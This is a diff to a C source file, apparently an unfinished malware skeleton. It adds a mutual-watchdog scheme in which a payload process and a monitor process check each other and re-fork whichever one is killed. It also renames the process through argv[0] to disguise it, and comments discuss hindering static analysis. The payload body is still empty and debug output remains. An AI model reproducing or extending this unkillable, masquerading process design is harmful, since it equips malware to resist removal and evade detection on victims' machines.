@@ -6,6 +6,11 @@
 // To make static binary analysis more difficult consider:
 // - removing all DEBUG print statements
 
+// Important note:
+// Let's say that process P1 has threads A and B
+// Forking inside of P1->A will create a copy of P1->A
+// It will not create a copy of P1->B
+
 #include <pthread.h>
 #include <stdio.h>
 #include <stdbool.h>
@@ -18,20 +23,21 @@
 // lets monitor() know how to respond to a dead process
 #define MONITOR 1
 #define PAYLOAD 2
-#define NAP_TIME 0.25
+#define NAP_TIME 1
 
 #define DEBUG if( true == bDebug )
 bool bDebug = true;
-
-typedef struct monitor_args {
-    int iMode;
-    pid_t pid_monitor; // pid to monitor
-} monitor_args;
 
 typedef struct payload_args {
     int argc;
     char **argv;
 } payload_args;
+
+typedef struct monitor_args {
+    int iMode;         // the mode of the current process
+    pid_t pid_monitor; // pid to monitor
+    payload_args* ppa; // needed for when the monitor restarts the payload
+} monitor_args;
 
 void* monitor(void *arg);
 void* payload(void *arg);
@@ -47,6 +53,7 @@ int main(int argc, char *argv[]) {
     pthread_t tid_payload;
     pthread_t tid_monitor;
     pid_t pid;
+    payload_args* ppa = get_payload_args(argc, argv, iUsed);
 
     pid = fork();
 
@@ -59,13 +66,16 @@ int main(int argc, char *argv[]) {
     // child: execute payload and monitor the parent
     else if( 0 == pid ) {
 
+        strcpy(argv[0], "makid");
+        sleep(1);
+
         // execute the payload
-        pthread_create(&tid_payload, (void*)NULL, payload, (void*)get_payload_args(argc, argv, iUsed));
+        pthread_create(&tid_payload, (void*)NULL, payload, (void*)ppa);
         DEBUG fprintf(stderr, "    Thread (payload->payload): tid = %ld from pid = %d\n", tid_payload, getpid());
 
         // monitor the parent
         pid_t pid_parent = getppid();
-        monitor_args ma = { PAYLOAD, pid_parent };
+        monitor_args ma = { PAYLOAD, pid_parent, ppa };
         pthread_create(&tid_monitor, (void*)NULL, monitor, &ma);
         DEBUG fprintf(stderr, "    Thread (payload->monitor): tid = %ld from pid = %d\n", tid_monitor, getpid());
 
@@ -76,50 +86,123 @@ int main(int argc, char *argv[]) {
     // parent: monitor the the child (payload)
     else {
 
-        monitor_args ma = { MONITOR, pid };
+        monitor_args ma = { MONITOR, pid, ppa };
         pthread_create(&tid_monitor, (void*)NULL, monitor, &ma);
         DEBUG fprintf(stderr, "    Thread (monitor->monitor): tid = %ld from pid = %d\n", tid_monitor, getpid());
         pthread_join(tid_monitor, (void*)NULL);
 
         while( -1 != wait(NULL) );
+
+        /*
+        monitor_args ma = { MONITOR, pid };
+        monitor(&ma);
+        */
     }
 }
 
 void* monitor(void *arg) {
     
+    // ma.iMode: mode of the current process
+    // ma.pid_monitor: pid of the process to monitor
     monitor_args ma = *((monitor_args*)arg);
-    pid_t pid_monitor = ma.pid_monitor;
     DEBUG fprintf(stderr, "Monitor: pid = %d -> pid = %d\n", getpid(), ma.pid_monitor);
+
+    pthread_t tid_new_payload;
 
     while ( true ) {
 
         // free the PCB if the process is dead
-        waitpid(pid_monitor, NULL, WNOHANG);
+        waitpid(ma.pid_monitor, NULL, WNOHANG);
 
         // check to see if the process is dead
-        if( 0 != kill(pid_monitor, 0) ) {
+        if( 0 != kill(ma.pid_monitor, 0) ) {
+            
+            pid_t pid = fork();
 
-            // if the current process is a PAYLAOD
+            if( pid < 0 ) {
+        
+                DEBUG fprintf(stderr, "\nFork failed\n");
+                exit(-1);
+            }
+
+            // The process that was killed was in PAYLOAD mode
+            // The current process is in MONITOR mode
+            // The MONITOR's monitor was duplicated 
+            // Make the corresponding adjustments to the parent and child's copies of monitor_args ma
             if( MONITOR == ma.iMode ) {
-                fprintf(stderr, "Monitor: payload process was killed\n");
+                
+                DEBUG fprintf(stderr, "Monitor: payload (pid = %d) was killed\n", ma.pid_monitor);
+
+                // The current process is in MONITOR mode
+                // A new process in PAYLOAD mode needs to be created
+                // A process in payload mode has 2 threads:
+                // - monitor thread
+                // - payload thread
 
                 // WORKS! Dead process is detected
                 // payload_args
                 // fork -> payload thread AND monitor thread
+
+                // child process (switch to PAYLOAD mode)
+                if( 0 == pid ) {
+                    
+                    DEBUG fprintf(stderr, "- monitor(): BEFORE\n");
+                    ma.iMode = PAYLOAD;         // the current process switches to PAYLOAD mode
+                    ma.pid_monitor = getppid(); // monitor the parent which is in MONITOR mode
+
+                    // idk why, but pthread_create makes it to where there is only one malskel in task manager
+                    // if you take away pthread_create, you can see 2 malskels in the task manager
+
+                    if( NULL == ma.ppa ) {
+                        DEBUG fprintf(stderr, "ERROR: monitor(): ma.ppa is NULL\n");
+                    }
+
+                    pthread_create(&tid_new_payload, (void*)NULL, payload, (void*)ma.ppa);
+                    pthread_detach(tid_new_payload);
+                    // pthread_join(tid_new_payload, (void*)NULL);
+                    DEBUG fprintf(stderr, "- monitor(): AFTER\n");
+                }
+
+                // parent process (remain in MONITOR mode))
+                else {
+                    
+                    ma.pid_monitor = pid; // monitor the child which is in PAYLOAD mode
+                }
             }
 
-            // if the current process is a MONITOR
+            // The process that was killed was in MONITOR mode
+            // The current process is in PAYLOAD mode
+            // The PAYLOAD's monitor was duplicated
+            // Make the corresponding adjustments to parent and child's copies of monitor_args ma
             else if ( PAYLOAD == ma.iMode ) {
-                fprintf(stderr, "Payload: monitor process was killed\n");
+
+                DEBUG fprintf(stderr, "Payload: monitor (pid = %d) was killed\n", ma.pid_monitor);
+
+                // The current process is in PAYLOAD mode
+                // A new process in MONITOR mode needs to be created
+                // The new process will only monitor, so there is no need for threads
 
                 // WORKS! Dead process is detected
                 // monitor_args
                 // fork -> call monitor (no need for a thread)
+
+                // child process (switch to MONITOR mode)
+                if( 0 == pid ) {
+                    
+                    ma.iMode = MONITOR;         // the current process switches to MONITOR mode
+                    ma.pid_monitor = getppid(); // monitor the parent which is in PAYLOAD mode
+                }
+
+                // parent process
+                else {
+
+                    ma.pid_monitor = pid; // monitor the child which is in MONITOR mode
+                }
             }
 
             // unexpected behavior
             else {
-                DEBUG fprintf(stderr, "Unexpected beavior\n");
+                DEBUG fprintf(stderr, "Unexpected behavior\n");
                 exit(-1);
             }
         }
@@ -128,13 +211,22 @@ void* monitor(void *arg) {
         sleep(NAP_TIME);
     }
 
+    DEBUG fprintf(stderr, "EXITED payload(): pid = %d\n", getpid());
     return NULL;
 }
 
 void* payload(void *arg) {
 
+    // REMOVE ME LATER
+    // REMOVE ME LATER
+    // REMOVE ME LATER
+    if( NULL == arg ) {
+        DEBUG fprintf(stderr, "ERROR: payload(): arg is NULL\n");
+    }
+
     // process arg
     payload_args pa = *((payload_args*)arg);
+
     int argc = pa.argc;
     char** argv = pa.argv;
 
@@ -144,8 +236,6 @@ void* payload(void *arg) {
     // fprintf(stderr, "Payload: argv[0] = %s\n", argv[0]);
 
     DEBUG fprintf(stderr, "Payload: pid = %d\n", getpid());
-
-    sleep(100);
 
     return NULL;
 }
@@ -190,7 +280,7 @@ payload_args* get_payload_args(int argc, char *argv[], int iUsed) {
     int i;
     for( i = 0 ; i < iPayloadArgs ; i++ ) {
         p_argv[i] = argv[i+iOffset];
-        fprintf(stderr, "p_argv[%d] = %s\n", i, p_argv[i]);
+        DEBUG fprintf(stderr, "p_argv[%d] = %s\n", i, p_argv[i]);
     }
 
     ppa->argc = iPayloadArgs;
@@ -198,3 +288,10 @@ payload_args* get_payload_args(int argc, char *argv[], int iUsed) {
     
     return ppa;
 }
+
+/*
+monitor_args* new_monitor_args(int iMode, int pid_monitor, payload_args* ppa) {
+
+    monitor_args* = (monitor_args*)malloc(sizeof(monitor))
+}
+*/
